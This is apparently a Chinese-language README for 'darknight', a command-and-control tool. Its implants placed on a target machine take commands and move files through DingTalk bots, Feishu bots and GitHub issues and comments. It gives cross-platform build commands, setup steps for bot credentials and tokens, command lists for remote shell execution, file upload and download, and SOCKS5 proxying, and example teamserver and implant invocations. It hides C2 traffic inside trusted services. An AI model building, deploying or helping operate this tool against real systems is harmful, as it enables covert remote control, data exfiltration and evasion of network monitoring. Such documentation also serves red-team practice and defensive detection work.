# darknight
**A C2 communication tool hidden in the darknight**

# 简略架构图

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017111505.png" alt="image-20241017111505799" style="zoom:50%;" />

# 构建

```bash
# 下载依赖
go mod tidy
# 构建本地环境架构的二进制文件
go build
# 构建不同架构平台的二进制文件
GOOS=windows GOARCH=amd64 go build -o darknight_windows_amd64.exe
GOOS=linux GOARCH=amd64 go build -o darknight_linux_amd64
GOOS=darwin GOARCH=arm64 go build -o darknight_macos_arm64
```

# 钉钉

## bot 配置

启动 implant 注入端我们需要四个参数值：`implant <client_id> <client_secret> <robot_code> <user_id>`

打开开发者后台：https://open-dev.dingtalk.com/fe/app

选择钉钉应用，创建企业内部应用：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022010342.png" alt="image-20241022010342300" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022010404.png" alt="image-20241022010404238" style="zoom:25%;" />

创建完成已进入应用，就可以看到我们需要的两个参数值**<client_id>和<client_secret>**：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022011102.png" alt="image-20241022011102696" style="zoom:25%;" />

添加应用能力添加机器人，然后配置成 stream 模式即可，同时，这里有我们需要的**<robot_code>**：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022010808.png" alt="image-20241022010808210" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022010925.png" alt="image-20241022010925651" style="zoom:25%;" />

来到权限管理页面，开启以下权限：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022013344.png" alt="image-20241022013344313" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022013400.png" alt="image-20241022013400293" style="zoom:25%;" />

然后需要发布版本才能进行使用：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022013451.png" alt="image-20241022013451054" style="zoom:25%;" />

最后我们打开钉钉客户端，有两种方式使用该C2进行通信，一种是直接与bot私聊，另一种是在群组添加该bot，然后直接@bot名字即可使用；

下面是将bot加入企业默认群组的流程：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022013832.png" alt="image-20241022013832736" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022013901.png" alt="image-20241022013901381" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022013940.png" alt="image-20241022013940429" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022013955.png" alt="image-20241022013955818" style="zoom:25%;" />

## 命令大全

> - help : show this help menu
> - pwd : print working directory
> - whoami : get username
> - cmd <command> : execute command
> - <upload(No Command)> : send the file directly to the bot, and the file will be downloaded to the current working directory
> - download <remote_file_name> : download remote_file of dingding-implant to the folder of dingding knowledge base
> - exit : kill the connection with the dingding-implant

## 使用示例

直接 go build 就能食用 implant 注入端；

启动需要四个参数：`implant <client_id> <client_secret> <robot_code> <user_id>`

四个参数如何配置请参考前面的配置教程；

implant 端启动后，选择有 bot 的群组@bot，或者与 bot 私聊都能触发c2通信；（其中，除了上传文件只能私聊 bot触发，其他均可以通过群组@bot 或者私聊进行触发）

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022000004.png" alt="image-20241022000004100" style="zoom:25%;" />

cmd执行命令：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022000148.png" alt="image-20241022000148630" style="zoom:25%;" />

上传文件（只能私聊 bot上传）：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022000316.png" alt="image-20241022000316359" style="zoom:25%;" />

download下载文件到钉钉知识库（需要提前创建一个c2 文件夹，绝对路径和相对路径都可以），例如下载刚才上传的 agent：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022000654.png" alt="image-20241022000654712" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022000439.png" alt="image-20241022000438926" style="zoom:25%;" />

exit退出：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022000741.png" alt="image-20241022000741879" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022000821.png" alt="image-20241022000821898" style="zoom:25%;" />

# 飞书

## bot 配置

打开开发者后台：https://open.feishu.cn/app/

选择创建企业自建应用：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022004725.png" alt="image-20241022004725900" style="zoom:25%;" />

点进 bot，就可以看到我们需要的**<app_id>和<app_secret>**了：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022001315.png" alt="image-20241022001315087" style="zoom:25%;" />

添加一个机器人：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022004705.png" alt="image-20241022004705290" style="zoom:25%;" />

在权限管理开启以下权限：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022005014.png" alt="image-20241022005014805" style="zoom:25%;" />

配置完成后，需要发布版本才能够使用：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022005117.png" alt="image-20241022005117449" style="zoom:25%;" />

最后打开飞书客户端，创建一个群组，在群组里面加入自己创建的 bot 就可以使用了：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022005234.png" alt="image-20241022005234701" style="zoom:25%;" />

## 命令大全

>- help : show this help menu
>- start : start the feishu-implant
> - pwd : print working directory
> - whoami : get username
> - cmd \<command\> : execute command
> - upload <remote_file_name> : upload local file to the feishu-implant if your previous message is file
> - download <remote_file_name> : download remote_file of feishu-implant to current local feishu
> - exit : kill the connection with the feishu-implant

## 使用示例

>将飞书当作服务端，群组当作客户端，feishu-implant就是注入端，直接将 implant 放在靶机上面运行即可！
>
>implant 在靶机上运行后，我们需要在飞书群组输入 start 命令启动交互！

start启动：

<img src="https://aliyunoss.sakura501.top/img/2024/10/19/20241019014409.png" alt="image-20241019014409647" style="zoom: 25%;" />

cmd执行命令：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022005454.png" alt="image-20241022005454306" style="zoom:25%;" />

download下载文件：

<img src="https://aliyunoss.sakura501.top/img/2024/10/19/20241019014516.png" alt="image-20241019014516163" style="zoom:25%;" />

upload上传文件（**注意 upload xxxx 的上一条消息必须是一个文件，才能上传成功**）：

<img src="https://aliyunoss.sakura501.top/img/2024/10/19/20241019014807.png" alt="image-20241019014807458" style="zoom:25%;" />

exit 退出 implant 注入端：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022005543.png" alt="image-20241022005543432" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022005606.png" alt="image-20241022005606126" style="zoom:25%;" />

# github

## github-token(classic)配置

进入设置；

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017110836.png" alt="image-20241017110828736" style="zoom: 25%;" />

 进入开发者设置；

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017110936.png" alt="image-20241017110935958" style="zoom:25%;" />

在token(classic)中选择generate new token；

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017111054.png" alt="image-20241017111054689" style="zoom:25%;" />

填写名字、生效日期、以及勾上repo的所有权限，然后创建token即可，注意token只在创建时显示一次，注意保存；

<img src="https://aliyunoss.sakura501.top/img/2024/10/17/20241017111243.png" alt="image-20241017111243628" style="zoom:25%;" />

最后的token形式大概是ghp_xxxxxxxx这样的；

## 命令大全

> - help：帮助手册
>
> - pwd：当前工作目录；
> - whoami：当前用户名；
> - cmd \<command\>：执行command命令；
> - upload <local_file_path> <remote_file_name>：teamserver先上传本地文件local_file_path到github，并命名为remote_file_name，然后下载该remote_file_name到implant当前的工作目录；
> - download download <implant_file_path> <remote_file_name>：implant先上传implant的本地文件local_file_path到github，并命名为remote_file_name，然后下载该remote_file_name到teamserver当前的工作目录；
> - socks5 start/stop : turn on or off a SOCKS5 service
> - exit：切断与implant的连接，终止implant进程运行；

## 使用示例

> github相当于中间代理服务端，只需要用到其api；
>
> teamserver是服务端/客户端，放在attacker上运行；
>
> implant是注入端，放在靶机上面运行；
>
> 运行过程：
>
> - teamserver输入命令，调用github-api发送新的issue标题包含该命令；
>
> - implant会执行轮询获取新的issue的标题，获取到新的命令；
> - implant执行命令获取结果，加密该结果后返回给github，调用github-api向原issue的评论写入该结果；
> - teamserver轮询检测到新的评论写入，获取加密结果进行解密，输出到控制台；

```bash
# 需要在启动攻击机上启动teamserver，靶机上启动implant注入端
teamserver <AccessToken> <Username> <Repository>
implant <AccessToken> <Username> <Repository>
# 示例如下：
./teamserver ghp_xxxxxxxxx Sakura-501 github-c2-test
./implant ghp_xxxxxxxxx Sakura-501 github-c2-test
```

启动效果如下；

teamserver端启动：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022114332.png" alt="image-20241022114332536" style="zoom:25%;" />

implant端启动：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022124057.png" alt="image-20241022124056895" style="zoom:25%;" />

cmd执行命令：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022124350.png" alt="image-20241022124349922" style="zoom:25%;" />

upload <local_file_path> <remote_file_name>上传文件：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022125316.png" alt="image-20241022125316764" style="zoom:25%;" />

download <implant_file_path> <remote_file_name>下载文件：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022125708.png" alt="image-20241022125708833" style="zoom:25%;" />

socks5 start启动：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022114607.png" alt="image-20241022114607742" style="zoom:25%;" />

socks5协议使用：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022114544.png" alt="image-20241022114544408" style="zoom:25%;" />

exit退出：

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022125848.png" alt="image-20241022125848170" style="zoom:25%;" />

<img src="https://aliyunoss.sakura501.top/img/2024/10/22/20241022125902.png" alt="image-20241022125901957" style="zoom:25%;" />